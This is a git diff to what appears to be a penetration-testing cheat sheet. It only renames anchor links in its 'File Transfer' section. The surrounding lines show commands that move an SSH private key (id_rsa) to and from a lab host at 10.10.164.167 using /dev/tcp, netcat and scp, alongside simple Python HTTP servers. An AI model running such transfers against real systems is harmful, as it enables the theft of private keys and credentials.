@@ -57,9 +57,9 @@ ____
 ### File Transfer
 * #### [Bash Upload](#bash_upload)
 * #### [Bash Download](#bash_download)
-* #### [Netcat](#netcat)
-* #### [Python](#python)
-* #### [SCP](#scp)
+* #### [Netcat](#netcat_transfer)
+* #### [Python](#python_transfer)
+* #### [SCP](#scp_transfer)
 
 ____
 
@@ -655,7 +655,7 @@ nc -l -p 1337 < id_rsa
 ```html
 bash -c 'cat < /dev/tcp/10.10.164.167/1337 > id_rsa'
 ```
-### File Transfer > <a name="netcat"></a>Netcat
+### File Transfer > <a name="netcat_transfer"></a>Netcat
 ###### Upload payload
 ```html
 nc -lnvp 1337
@@ -666,7 +666,7 @@ nc 10.10.164.167 1337 < id_rsa
 nc 10.10.164.167 1337 < id_rsa
 nc -lnvp 1337 > file_saved
 ```
-### File Transfer > <a name="python"></a>Python
+### File Transfer > <a name="python_transfer"></a>Python
 ###### Python3 HTTP Server
 ```html
 python3 -m http.server 1337
@@ -675,7 +675,7 @@ python3 -m http.server 1337
 ```html
 python -m SimpleHTTPServer 1337
 ```
-### File Transfer > <a name="scp"></a>SCP
+### File Transfer > <a name="scp_transfer"></a>SCP
 ###### Upload from local host to remote computer
 ```html
 scp id_rsa username@10.10.164.167:~/destination -P 1337
